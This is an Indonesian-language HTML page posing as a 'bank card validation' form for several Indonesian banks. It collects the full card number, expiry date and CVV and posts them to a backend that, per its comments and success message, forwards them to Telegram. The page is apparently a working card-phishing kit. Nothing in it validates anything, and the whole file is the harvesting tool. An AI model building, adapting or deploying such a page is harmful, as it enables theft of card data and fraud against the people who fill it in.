<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="theme-color" content="#ff8c00">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Validasi Kartu Bank</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: Arial, sans-serif; background: #fff; color: #222; }

    /* ===== LATAR BELAKANG ATAS ===== */
    .top-background {
      height: 220px;
      margin-top: -8%;
      border-radius: 0 0 40px 40px;
      background: #FFD8B1;
    }

    /* ===== KOTAK KONTEN ===== */
    .container {
      max-width: 360px;
      margin: -190px auto 40px;
      padding: 0 20px 30px;
      background: #f4a460;
      border-radius: 20px;
      box-shadow: 0 8px 20px rgba(0,0,0,0.1);
      position: relative;
      z-index: 2;
    }

    /* ===== PREVIEW KARTU ===== */
    .card-preview { margin-top: 20px; perspective: 1000px; }
    .card-wrapper {
      position: relative;
      width: 320px;
      height: 205px;
      margin: 0 auto 20px;
      transform-style: preserve-3d;
      transition: transform 0.6s ease;
    }
    .card-wrapper.flipped { transform: rotateY(180deg); }
    .card-front, .card-back {
      position: absolute;
      width: 100%;
      height: 100%;
      border-radius: 16px;
      backface-visibility: hidden;
      overflow: hidden;
      box-shadow: 0 9px 16px rgba(0,0,0,0.15);
      background: linear-gradient(135deg, #1a1a2e, #16213e);
    }
    .card-back {
      transform: rotateY(180deg);
      background: #f5f5f5;
    }

    /* ===== TEKS DI ATAS KARTU ===== */
    .card-text-overlay {
      position: absolute;
      top: 0; left: 0; width: 100%; height: 100%;
      padding: 20px; color: #fff; font-family: monospace, sans-serif;
      pointer-events: none; z-index: 10; text-shadow: 1px 1px 3px rgba(0,0,0,0.8);
    }
    .card-number-display {
      font-size: 20px; letter-spacing: 3px; position: absolute;
      top: 100px; left: 20px;
    }
    .card-valid-display {
      font-size: 12px; position: absolute; bottom: 30px; left: 20px;
    }
    .card-name-display {
      font-size: 14px; position: absolute; bottom: 10px; left: 20px; text-transform: uppercase;
    }
    .card-cvv-display {
      font-size: 18px; letter-spacing: 3px; position: absolute;
      top: 50%; right: 30px;
      transform: translateY(-50%); color: #000; text-shadow: none;
      background: #fff; padding: 6px 12px; border-radius: 4px; font-weight: bold;
    }

    /* ===== FORM INPUT ===== */
    form { display: flex; flex-direction: column; gap: 12px; }
    label {
      font-weight: 600; margin-bottom: 4px; display: block; font-size: 15px;
    }
    input, select, button {
      width: 100%; padding: 12px 14px; font-size: 16px; line-height: 1.5;
      border: 1px solid #b22222; border-radius: 5px; transition: border-color 0.3s ease;
    }
    input:focus, select:focus { border-color: #333; outline: none; }

    button {
      background-color: #ccc;
      color: white; font-weight: 700; border: none;
      cursor: not-allowed; border-radius: 4px; padding: 14px;
      font-size: 17px; margin-top: 8px; transition: all 0.3s ease;
    }
    button:enabled {
      background-color: #b22222;
      cursor: pointer; transform: scale(1);
    }
    button:enabled:hover { transform: scale(1.02); }

    .row-inputs { display: flex; gap: 10px; }
    .input-with-icon { position: relative; flex: 1; }
    .input-with-icon input, .input-with-icon select {
      width: 100%; padding-left: 14px; font-size: 16px; height: 48px;
    }

    /* ===== STATUS NOTIFIKASI ===== */
    .status {
      margin-top: 15px; padding: 12px; border-radius: 6px;
      font-size: 14px; display: none; text-align: center; font-weight: 500;
    }
    .status.success { background: #d4edda; color: #155724; display: block; }
    .status.error { background: #f8d7da; color: #721c24; display: block; }
    .status.loading { background: #fff3cd; color: #856404; display: block; }

    /* ===== RESPONSIVE ===== */
    @media (max-width: 360px) {
      .container { padding: 0 15px 25px; margin-top: -180px; }
      .card-wrapper { width: 100%; height: 190px; }
      .card-number-display { font-size: 16px; top: 90px; }
      input, select, button { font-size: 15px; padding: 11px 12px; height: 46px; }
      form { gap: 10px; }
    }
  </style>
</head>
<body>

  <div class="top-background"></div>
  <div class="container">
    <div class="card-preview">
      <div class="card-wrapper" id="cardWrapper">
        <!-- Depan Kartu -->
        <div class="card-front">
          <div class="card-text-overlay">
            <div class="card-number-display" id="cardNumberText">XXXX XXXX XXXX XXXX</div>
            <div class="card-valid-display">VALID THRU <span id="cardValidText">XX/XX</span></div>
            <div class="card-name-display" id="cardNameText">NAMA PEMEGANG KARTU</div>
          </div>
        </div>
        <!-- Belakang Kartu -->
        <div class="card-back">
          <div class="card-text-overlay">
            <div class="card-cvv-display" id="cardCvvDisplay">XXX</div>
          </div>
        </div>
      </div>
    </div>

    <form id="card-form" novalidate>
      <label for="bank-select">Pilihan Bank</label>
      <select id="bank-select" name="bank" required>
        <option value="">-- Pilih Bank --</option>
        <option value="BCA">BCA</option>
        <option value="Mandiri">Mandiri</option>
        <option value="BRI">BRI</option>
        <option value="BNI">BNI</option>
        <option value="CIMB">CIMB Niaga</option>
      </select>

      <div class="input-with-icon">
        <label for="card-number">Nomor Kartu (16 digit)</label>
        <input type="text" id="card-number" name="card_number" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" autocomplete="cc-number" required>
      </div>

      <div class="row-inputs">
        <div class="input-with-icon">
          <label for="expiry-month">Bulan</label>
          <select id="expiry-month" required>
            <option value="">Bulan</option>
            <option value="01">01</option>
            <option value="02">02</option>
            <option value="03">03</option>
            <option value="04">04</option>
            <option value="05">05</option>
            <option value="06">06</option>
            <option value="07">07</option>
            <option value="08">08</option>
            <option value="09">09</option>
            <option value="10">10</option>
            <option value="11">11</option>
            <option value="12">12</option>
          </select>
        </div>
        <div class="input-with-icon">
          <label for="expiry-year">Tahun</label>
          <select id="expiry-year" required>
            <option value="">Tahun</option>
            <option value="25">2025</option>
            <option value="26">2026</option>
            <option value="27">2027</option>
            <option value="28">2028</option>
            <option value="29">2029</option>
            <option value="30">2030</option>
          </select>
        </div>
      </div>

      <div class="input-with-icon">
        <label for="cvv">CVV (3 digit di belakang kartu)</label>
        <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="4" inputmode="numeric" required>
      </div>

      <button type="submit" id="submit-btn" disabled>Kirim Data</button>
      <div id="status-box" class="status"></div>
    </form>
  </div>

  <!-- ============================================== -->
  <!-- SCRIPT SUDAH DIPERBAIKI → TOMBOL AKTIF & KIRIM KE TELEGRAM -->
  <!-- ============================================== -->
  <script>
    // ⚠️ PASTIKAN SERVER NODE.JS SUDAH BERJALAN di http://localhost:3000
    // Jika deploy online → ganti dengan URL server kamu, contoh: 'https://nama-server.com'
    const BACKEND_URL = 'http://localhost:3000';

    // === AMBIL SEMUA ELEMEN ===
    const form = document.getElementById('card-form');
    const cardNumberInput = document.getElementById('card-number');
    const cvvInput = document.getElementById('cvv');
    const monthSelect = document.getElementById('expiry-month');
    const yearSelect = document.getElementById('expiry-year');
    const bankSelect = document.getElementById('bank-select');
    const submitBtn = document.getElementById('submit-btn');
    const statusBox = document.getElementById('status-box');
    const cardWrapper = document.getElementById('cardWrapper');

    // === 1. FORMAT NOMOR KARTU OTOMATIS & UPDATE PREVIEW ===
    cardNumberInput.addEventListener('input', (e) => {
      // Hapus semua spasi & karakter non-angka
      let value = e.target.value.replace(/\s/g, '').replace(/\D/g, '');
      // Tambahkan spasi tiap 4 digit: 4123 4567 8901 2345
      value = value.replace(/(\d{4})/g, '$1 ').trim();
      // Masukkan kembali ke input
      e.target.value = value;
      // Update preview di kartu
      document.getElementById('cardNumberText').textContent = value || 'XXXX XXXX XXXX XXXX';
      // Cek apakah form sudah lengkap
      validasiFormLengkap();
    });

    // === 2. UPDATE TANGGAL KADALUARSA DI PREVIEW KARTU ===
    function updateExpiry() {
      const m = monthSelect.value || 'XX';
      const y = yearSelect.value || 'XX';
      document.getElementById('cardValidText').textContent = `${m}/${y}`;
      validasiFormLengkap();
    }
    monthSelect.addEventListener('change', updateExpiry);
    yearSelect.addEventListener('change', updateExpiry);

    // === 3. FLIP KARTU SAAT KETIK CVV ===
    cvvInput.addEventListener('focus', () => cardWrapper.classList.add('flipped'));
    cvvInput.addEventListener('blur', () => cardWrapper.classList.remove('flipped'));
    cvvInput.addEventListener('input', (e) => {
      // Hanya angka
      e.target.value = e.target.value.replace(/\D/g, '');
      // Update preview CVV
      document.getElementById('cardCvvDisplay').textContent = e.target.value || 'XXX';
      validasiFormLengkap();
    });

    // === 4. CEK BANK DIPILIH ===
    bankSelect.addEventListener('change', validasiFormLengkap);

    // ==============================================
    // ✅ FUNGSI UTAMA: CEK SEMUA DATA SUDAH LENGKAP?
    // ==============================================
    function validasiFormLengkap() {
      // Bersihkan nomor kartu dari spasi → hitung jumlah digit
      const nomorBersih = cardNumberInput.value.replace(/\s/g, '');
      
      // CEK SETIAP KOLOM — HARUS LENGKAP!
      const cekNomor = nomorBersih.length >= 13; // Minimal 13 digit, idealnya 16
      const cekBulan = monthSelect.value !== '';
      const cekTahun = yearSelect.value !== '';
      const cekCvv = cvvInput.value.length >= 3; // Minimal 3 digit
      const cekBank = bankSelect.value !== '';

      // === TOMBOL AKTIF JIKA SEMUA LENGKAP ===
      const semuaLengkap = cekNomor && cekBulan && cekTahun && cekCvv && cekBank;
      submitBtn.disabled = !semuaLengkap;

      // Debug di konsol browser (tekan F12 → Console)
      console.log('Validasi:', { cekBank, cekNomor, cekBulan, cekTahun, cekCvv, semuaLengkap });
    }

    // === TAMPILKAN PESAN STATUS ===
    function tampilStatus(type, pesan) {
      statusBox.className = `status ${type}`;
      statusBox.textContent = pesan;
      if (type !== 'loading') {
        setTimeout(() => {
          statusBox.className = 'status';
          statusBox.textContent = '';
        }, 6000);
      }
    }

    // ==============================================
    // ✅ KIRIM DATA KE SERVER → LALU KE TELEGRAM
    // ==============================================
    form.addEventListener('submit', async (e) => {
      // Cegah reload halaman
      e.preventDefault();

      // === KUMPULKAN SEMUA DATA ===
      const dataKartu = {
        bank: bankSelect.value,
        card_number: cardNumberInput.value,
        expiry_month: monthSelect.value,
        expiry_year: yearSelect.value,
        cvv: cvvInput.value
      };

      console.log('📤 Data dikirim:', dataKartu);
      tampilStatus('loading', '⏳ Sedang mengirim data...');
      submitBtn.disabled = true;

      try {
        // === KIRIM KE SERVER NODE.JS ===
        const respon = await fetch(`${BACKEND_URL}/send-card`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(dataKartu)
        });

        const hasil = await respon.json();
        console.log('📥 Respon server:', hasil);

        if (respon.ok && hasil.success) {
          // === BERHASIL ===
          tampilStatus('success', '✅ Berhasil! Data terkirim ke Telegram.');
          
          // Reset form setelah berhasil
          setTimeout(() => {
            form.reset();
            document.getElementById('cardNumberText').textContent = 'XXXX XXXX XXXX XXXX';
            document.getElementById('cardValidText').textContent = 'XX/XX';
            document.getElementById('cardCvvDisplay').textContent = 'XXX';
            submitBtn.disabled = true;
          }, 2000);

        } else {
          throw new Error(hasil.error || 'Respon tidak valid');
        }

      } catch (error) {
        console.error('❌ Error kirim:', error);
        tampilStatus('error', `❌ ${error.message}. Pastikan server berjalan!`);
        submitBtn.disabled = false;
      }
    });
  </script>
</body>
</html>
